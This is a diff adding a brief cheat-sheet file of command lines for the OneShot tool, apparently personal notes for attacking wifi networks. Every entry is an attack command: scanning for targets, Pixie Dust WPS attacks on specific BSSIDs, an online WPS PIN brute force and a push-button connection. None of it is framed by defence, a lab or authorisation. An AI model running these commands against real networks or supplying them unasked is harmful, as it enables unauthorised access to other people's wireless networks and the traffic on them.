@@ -1,0 +1,27 @@
+scan wifi network and wps attack
+python3 OneShot/oneshot.py -i wlan0 --iface-down -K
+
+
+direct wps attack
+python3 oneshot.py -i wlan0 --iface-down -K -b 48:22:54:2B:C6:98
+
+
+=============
+
+Start Pixie Dust attack on a specified BSSID:
+
+sudo python3 oneshot.py -i wlan0 -b 00:90:4C:C1:AC:21 -K
+
+Show avaliable networks and start Pixie Dust attack on a specified network:
+
+sudo python3 oneshot.py -i wlan0 -K
+
+Launch online WPS bruteforce with the specified first half of the PIN:
+
+sudo python3 oneshot.py -i wlan0 -b 00:90:4C:C1:AC:21 -B -p 1234
+
+Start WPS push button connection:s
+
+sudo python3 oneshot.py -i wlan0 --pbc
+
+
